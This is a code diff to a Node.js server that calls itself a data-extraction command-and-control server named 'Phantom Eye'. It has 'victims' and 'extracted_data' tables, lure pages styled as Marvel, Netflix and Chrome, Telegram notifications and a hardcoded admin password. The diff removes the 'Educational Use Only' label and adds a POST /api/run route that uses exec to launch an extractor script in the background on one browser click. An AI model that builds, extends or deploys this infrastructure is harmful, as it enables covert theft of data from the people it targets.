@@ -1,7 +1,6 @@
 // ================================================
-// PHANTOM EYE - Advanced Data Extraction C2 Server
-// With Telegram Notifications
-// Educational Use Only
+// PHANTOM EYE - COMPLETE SERVER
+// WITH /api/run ROUTE FOR ONE-CLICK EXECUTION
 // ================================================
 
 const express = require('express');
@@ -15,9 +14,10 @@ const { v4: uuidv4 } = require('uuid');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
 const axios = require('axios');
+const { exec } = require('child_process');
 
 // ================================================
-// CONFIGURATION - EDIT THESE!
+// CONFIGURATION
 // ================================================
 const CONFIG = {
     server: {
@@ -45,7 +45,6 @@ class Database {
 
     init() {
         this.db.serialize(() => {
-            // Victims table
             this.db.run(`
                 CREATE TABLE IF NOT EXISTS victims (
                     id TEXT PRIMARY KEY,
@@ -62,7 +61,6 @@ class Database {
                 )
             `);
 
-            // Extracted data table
             this.db.run(`
                 CREATE TABLE IF NOT EXISTS extracted_data (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -73,7 +71,6 @@ class Database {
                 )
             `);
 
-            // Admins table
             this.db.run(`
                 CREATE TABLE IF NOT EXISTS admins (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -82,7 +79,6 @@ class Database {
                 )
             `);
 
-            // Create default admin
             this.db.get('SELECT * FROM admins LIMIT 1', (err, row) => {
                 if (!row) {
                     const hashed = bcrypt.hashSync(CONFIG.admin.password, 10);
@@ -221,9 +217,6 @@ class Server {
         this.app.use(express.static(path.join(__dirname, 'public')));
     }
 
-    // ================================================
-    // SETUP ROUTES - ALL ROUTES GO INSIDE HERE
-    // ================================================
     setupRoutes() {
         // ===== PUBLIC =====
         this.app.get('/', (req, res) => {
@@ -247,13 +240,66 @@ class Server {
             res.sendFile(path.join(__dirname, 'client', 'extractor.js'));
         });
 
-        // ===== DOWNLOAD INSTALLER =====
-        this.app.get('/download/installer.js', (req, res) => {
-            const installerPath = path.join(__dirname, 'public', 'download', 'installer.js');
-            if (fs.existsSync(installerPath)) {
-                res.sendFile(installerPath);
-            } else {
-                res.status(404).send('Installer not found');
+        // ================================================
+        // NEW: /api/run - EXECUTE PHANTOM EYE DIRECTLY
+        // ================================================
+        this.app.post('/api/run', async (req, res) => {
+            try {
+                console.log('👁️ Phantom Eye triggered by browser!');
+                
+                // Run the extractor as a child process
+                const extractorPath = path.join(__dirname, 'client', 'extractor.js');
+                
+                // Check if extractor exists
+                if (!fs.existsSync(extractorPath)) {
+                    return res.status(404).json({ 
+                        error: 'Extractor not found at: ' + extractorPath 
+                    });
+                }
+
+                console.log('📂 Running: ' + extractorPath);
+                
+                // Run extractor.js with node
+                const process = exec(`node "${extractorPath}"`, {
+                    timeout: 60000,
+                    windowsHide: true
+                });
+                
+                let output = '';
+                let errorOutput = '';
+                
+                process.stdout.on('data', (data) => {
+                    output += data;
+                    console.log('📊 Extractor output:', data);
+                });
+                
+                process.stderr.on('data', (data) => {
+                    errorOutput += data;
+                    console.log('⚠️ Extractor error:', data);
+                });
+                
+                process.on('close', (code) => {
+                    console.log(`✅ Extractor finished with code ${code}`);
+                    if (code === 0) {
+                        console.log('✅ Phantom Eye executed successfully');
+                    } else {
+                        console.log('❌ Phantom Eye failed with code:', code);
+                        console.log('Error output:', errorOutput);
+                    }
+                });
+                
+                res.json({
+                    success: true,
+                    message: 'Phantom Eye is running in the background!',
+                    pid: process.pid
+                });
+                
+            } catch (e) {
+                console.log('❌ Error running Phantom Eye:', e.message);
+                res.status(500).json({ 
+                    error: e.message,
+                    stack: e.stack 
+                });
             }
         });
 
@@ -387,9 +433,6 @@ class Server {
         });
     }
 
-    // ================================================
-    // WEB SOCKET
-    // ================================================
     setupWebSocket() {
         this.io.on('connection', (socket) => {
             console.log('🔌 Client connected:', socket.id);
@@ -422,9 +465,6 @@ class Server {
         });
     }
 
-    // ================================================
-    // START
-    // ================================================
     start() {
         this.server.listen(CONFIG.server.port, () => {
             console.log(`
@@ -439,9 +479,10 @@ class Server {
 ║   🎮 MARVEL: /marvel                                         ║
 ║   🎬 NETFLIX: /netflix                                      ║
 ║   🌐 CHROME: /chrome                                        ║
+║   🚀 RUN: POST /api/run                                     ║
 ║                                                               ║
 ║   🔑 Login: admin / Phantom2024!                            ║
-║   📱 Telegram: ${CONFIG.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE' ? '✅ Enabled' : '❌ Disabled (Add Token)'}     ║
+║   📱 Telegram: ${CONFIG.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE' ? '✅ Enabled' : '❌ Disabled'}     ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
             `);
